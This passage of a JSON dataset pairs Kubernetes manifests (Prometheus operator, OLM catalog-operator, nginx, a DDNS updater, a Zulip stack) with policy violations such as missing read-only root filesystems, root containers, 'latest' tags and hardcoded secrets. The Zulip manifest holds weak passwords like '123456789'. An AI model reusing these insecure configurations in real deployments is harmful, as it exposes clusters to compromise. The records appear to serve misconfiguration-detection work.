runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: prometheus-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-rbac-proxy\" does not have a read-only root file system"
  },
  {
    "id": "03896",
    "manifest_path": "data/manifests/the_stack_sample/sample_1729.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: kube-prometheus\n    app.kubernetes.io/version: 0.51.1\n  name: prometheus-operator\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: kube-prometheus\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: prometheus-operator\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: kube-prometheus\n        app.kubernetes.io/version: 0.51.1\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.51.1\n        image: quay.io/prometheus-operator/prometheus-operator:v0.51.1\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8080/\n        image: quay.io/brancz/kube-rbac-proxy:v0.11.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          limits:\n            cpu: 20m\n            memory: 40Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 65534\n      serviceAccountName: prometheus-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus-operator\" does not have a read-only root file system"
  },
  {
    "id": "03897",
    "manifest_path": "data/manifests/the_stack_sample/sample_1730.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob-km\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          parent: cronjobpi\n      spec:\n        containers:\n        - name: cronjob-ctr\n          image: perl\n          command:\n          - perl\n          - -Mbignum=bpi\n          - -wle\n          - print bpi(2000)\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cronjob-ctr\" is using an invalid container image, \"perl\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03898",
    "manifest_path": "data/manifests/the_stack_sample/sample_1730.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob-km\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          parent: cronjobpi\n      spec:\n        containers:\n        - name: cronjob-ctr\n          image: perl\n          command:\n          - perl\n          - -Mbignum=bpi\n          - -wle\n          - print bpi(2000)\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cronjob-ctr\" does not have a read-only root file system"
  },
  {
    "id": "03899",
    "manifest_path": "data/manifests/the_stack_sample/sample_1730.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob-km\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          parent: cronjobpi\n      spec:\n        containers:\n        - name: cronjob-ctr\n          image: perl\n          command:\n          - perl\n          - -Mbignum=bpi\n          - -wle\n          - print bpi(2000)\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cronjob-ctr\" is not set to runAsNonRoot"
  },
  {
    "id": "03900",
    "manifest_path": "data/manifests/the_stack_sample/sample_1730.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob-km\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          parent: cronjobpi\n      spec:\n        containers:\n        - name: cronjob-ctr\n          image: perl\n          command:\n          - perl\n          - -Mbignum=bpi\n          - -wle\n          - print bpi(2000)\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cronjob-ctr\" has cpu request 0"
  },
  {
    "id": "03901",
    "manifest_path": "data/manifests/the_stack_sample/sample_1730.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cronjob-km\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          parent: cronjobpi\n      spec:\n        containers:\n        - name: cronjob-ctr\n          image: perl\n          command:\n          - perl\n          - -Mbignum=bpi\n          - -wle\n          - print bpi(2000)\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cronjob-ctr\" has memory limit 0"
  },
  {
    "id": "03902",
    "manifest_path": "data/manifests/the_stack_sample/sample_1734.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        args:\n        - -namespace\n        - openshift-marketplace\n        - -configmapServerImage=quay.io/operator-framework/configmap-operator-registry:latest\n        - -writeStatusName\n        - operator-lifecycle-manager-catalog\n        - -tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - -tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:93751ae9d398d571c2cb3d11b0ac4ae052117fd1726025364a6f2f3a5caef68e\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: catalog-operator-serving-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"catalog-operator\" does not have a read-only root file system"
  },
  {
    "id": "03903",
    "manifest_path": "data/manifests/the_stack_sample/sample_1734.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        args:\n        - -namespace\n        - openshift-marketplace\n        - -configmapServerImage=quay.io/operator-framework/configmap-operator-registry:latest\n        - -writeStatusName\n        - operator-lifecycle-manager-catalog\n        - -tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - -tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:93751ae9d398d571c2cb3d11b0ac4ae052117fd1726025364a6f2f3a5caef68e\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: catalog-operator-serving-cert\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"catalog-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "03904",
    "manifest_path": "data/manifests/the_stack_sample/sample_1734.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        args:\n        - -namespace\n        - openshift-marketplace\n        - -configmapServerImage=quay.io/operator-framework/configmap-operator-registry:latest\n        - -writeStatusName\n        - operator-lifecycle-manager-catalog\n        - -tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - -tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:93751ae9d398d571c2cb3d11b0ac4ae052117fd1726025364a6f2f3a5caef68e\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: catalog-operator-serving-cert\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"catalog-operator\" has cpu request 0"
  },
  {
    "id": "03905",
    "manifest_path": "data/manifests/the_stack_sample/sample_1734.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: catalog-operator\n  namespace: openshift-operator-lifecycle-manager\n  labels:\n    app: catalog-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: catalog-operator\n  template:\n    metadata:\n      labels:\n        app: catalog-operator\n    spec:\n      serviceAccountName: olm-operator-serviceaccount\n      containers:\n      - name: catalog-operator\n        command:\n        - /bin/catalog\n        args:\n        - -namespace\n        - openshift-marketplace\n        - -configmapServerImage=quay.io/operator-framework/configmap-operator-registry:latest\n        - -writeStatusName\n        - operator-lifecycle-manager-catalog\n        - -tls-cert\n        - /var/run/secrets/serving-cert/tls.crt\n        - -tls-key\n        - /var/run/secrets/serving-cert/tls.key\n        image: quay.io/operator-framework/olm@sha256:93751ae9d398d571c2cb3d11b0ac4ae052117fd1726025364a6f2f3a5caef68e\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        - containerPort: 8081\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: catalog-operator-serving-cert\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"catalog-operator\" has memory limit 0"
  },
  {
    "id": "03906",
    "manifest_path": "data/manifests/the_stack_sample/sample_1741.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-users-allowed\n  labels:\n    app: nginx-users\nspec:\n  securityContext:\n    supplementalGroups:\n    - 199\n    fsGroup: 199\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      runAsUser: 199\n      runAsGroup: 199\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03907",
    "manifest_path": "data/manifests/the_stack_sample/sample_1741.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-users-allowed\n  labels:\n    app: nginx-users\nspec:\n  securityContext:\n    supplementalGroups:\n    - 199\n    fsGroup: 199\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      runAsUser: 199\n      runAsGroup: 199\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03908",
    "manifest_path": "data/manifests/the_stack_sample/sample_1741.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-users-allowed\n  labels:\n    app: nginx-users\nspec:\n  securityContext:\n    supplementalGroups:\n    - 199\n    fsGroup: 199\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      runAsUser: 199\n      runAsGroup: 199\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03909",
    "manifest_path": "data/manifests/the_stack_sample/sample_1741.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx-users-allowed\n  labels:\n    app: nginx-users\nspec:\n  securityContext:\n    supplementalGroups:\n    - 199\n    fsGroup: 199\n  containers:\n  - name: nginx\n    image: nginx\n    securityContext:\n      runAsUser: 199\n      runAsGroup: 199\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03910",
    "manifest_path": "data/manifests/the_stack_sample/sample_1746.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: general\n  name: ddns-updater-anagno-dev\nspec:\n  selector:\n    matchLabels:\n      app: ddns\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ddns\n    spec:\n      containers:\n      - name: ddns\n        image: anagno/gandi-ddns:0.3\n        env:\n        - name: DOMAIN\n          value: anagno.dev\n        - name: SUBDOMAIN\n          value: zh\n        - name: APIKEY\n          valueFrom:\n            secretKeyRef:\n              name: gandi\n              key: API_KEY\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ddns\" does not have a read-only root file system"
  },
  {
    "id": "03911",
    "manifest_path": "data/manifests/the_stack_sample/sample_1746.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: general\n  name: ddns-updater-anagno-dev\nspec:\n  selector:\n    matchLabels:\n      app: ddns\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ddns\n    spec:\n      containers:\n      - name: ddns\n        image: anagno/gandi-ddns:0.3\n        env:\n        - name: DOMAIN\n          value: anagno.dev\n        - name: SUBDOMAIN\n          value: zh\n        - name: APIKEY\n          valueFrom:\n            secretKeyRef:\n              name: gandi\n              key: API_KEY\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ddns\" is not set to runAsNonRoot"
  },
  {
    "id": "03912",
    "manifest_path": "data/manifests/the_stack_sample/sample_1746.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: general\n  name: ddns-updater-anagno-dev\nspec:\n  selector:\n    matchLabels:\n      app: ddns\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ddns\n    spec:\n      containers:\n      - name: ddns\n        image: anagno/gandi-ddns:0.3\n        env:\n        - name: DOMAIN\n          value: anagno.dev\n        - name: SUBDOMAIN\n          value: zh\n        - name: APIKEY\n          valueFrom:\n            secretKeyRef:\n              name: gandi\n              key: API_KEY\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ddns\" has cpu request 0"
  },
  {
    "id": "03913",
    "manifest_path": "data/manifests/the_stack_sample/sample_1746.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: general\n  name: ddns-updater-anagno-dev\nspec:\n  selector:\n    matchLabels:\n      app: ddns\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: ddns\n    spec:\n      containers:\n      - name: ddns\n        image: anagno/gandi-ddns:0.3\n        env:\n        - name: DOMAIN\n          value: anagno.dev\n        - name: SUBDOMAIN\n          value: zh\n        - name: APIKEY\n          valueFrom:\n            secretKeyRef:\n              name: gandi\n              key: API_KEY\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ddns\" has memory limit 0"
  },
  {
    "id": "03914",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable SECRETS_email_password in container \"zulip\" found"
  },
  {
    "id": "03915",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable SECRETS_secret_key in container \"zulip\" found"
  },
  {
    "id": "03916",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"memcached\" is using an invalid container image, \"quay.io/sameersbn/memcached:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03917",
    "manifest_path": "data/manifests/the_stack_sample/sample_1748.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: zulip-1\n  labels:\n    version: 1.8.0-2\n    app: zulip\nspec:\n  replicas: 1\n  selector:\n    version: 1.8.0-2\n    app: zulip\n  template:\n    metadata:\n      labels:\n        version: 1.8.0-2\n        app: zulip\n    spec:\n      containers:\n      - name: redis\n        image: quay.io/sameersbn/redis:latest\n        resources:\n          limits:\n            cpu: 50m\n        volumeMounts:\n        - name: redis-persistent-storage\n          mountPath: /var/lib/redis\n      - name: memcached\n        image: quay.io/sameersbn/memcached:latest\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n      - name: rabbitmq\n        image: rabbitmq:3.5.5\n        resources:\n          limits:\n            cpu: 75m\n            memory: 768Mi\n        env:\n        - name: RABBITMQ_DEFAULT_USER\n          value: zulip\n        - name: RABBITMQ_DEFAULT_PASS\n          value: zulip\n      - name: postgresql\n        image: quay.io/galexrt/zulip-postgresql-tsearchextras:latest\n        resources:\n          limits:\n            cpu: 80m\n            memory: 768Mi\n        env:\n        - name: DB_NAME\n          value: zulip\n        - name: DB_USER\n          value: zulip\n        - name: DB_PASS\n          value: zulip\n        volumeMounts:\n        - name: postgresql-persistent-storage\n          mountPath: /var/lib/postgresql\n      - name: zulip\n        image: quay.io/galexrt/zulip:1.8.0-2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 3584Mi\n        env:\n        - name: DB_HOST\n          value: database\n        - name: MEMCACHED_HOST\n          value: memcached\n        - name: REDIS_HOST\n          value: redis\n        - name: RABBITMQ_HOST\n          value: rabbitmq\n        - name: ZULIP_AUTH_BACKENDS\n          value: EmailAuthBackend\n        - name: SECRETS_email_password\n          value: '123456789'\n        - name: SETTING_EXTERNAL_HOST\n          value: localhost\n        - name: SETTING_ZULIP_ADMINISTRATOR\n          value: admin@example.com\n        - name: SETTING_ADMIN_DOMAIN\n          value: zerbytes.net\n        - name: SETTING_NOREPLY_EMAIL_ADDRESS\n          value: noreply@example.com\n        - name: SETTING_DEFAULT_FROM_EMAIL\n          value: Zulip <noreply@example.com>\n        - name: SETTING_EMAIL_HOST\n          value: smtp.example.com\n        - name: SETTING_EMAIL_HOST_USER\n          value: noreply@example.com\n        - name: ZULIP_USER_EMAIL\n          value: example@example.com\n        - name: ZULIP_USER_DOMAIN\n          value: example.com\n        - name: ZULIP_USER_PASS\n          value: '123456789'\n        - name: SECRETS_secret_key\n          value: REPLCAE_WITH_SECURE_SECRET_KEY\n        ports:\n        - containerPort: 80\n          name: http\n          protocol: TCP\n        - containerPort: 443\n          name: https\n          protocol: TCP\n        volumeMounts:\n        - name: zulip-persistent-storage\n          mountPath: /data\n      volumes:\n      - name: redis-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/redis\n      - name: postgresql-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/postgresql\n      - name: zulip-persistent-storage\n        hostPath:\n          path: /opt/docker/zulip/zulip\n",
    "policy_id": "latest-tag",
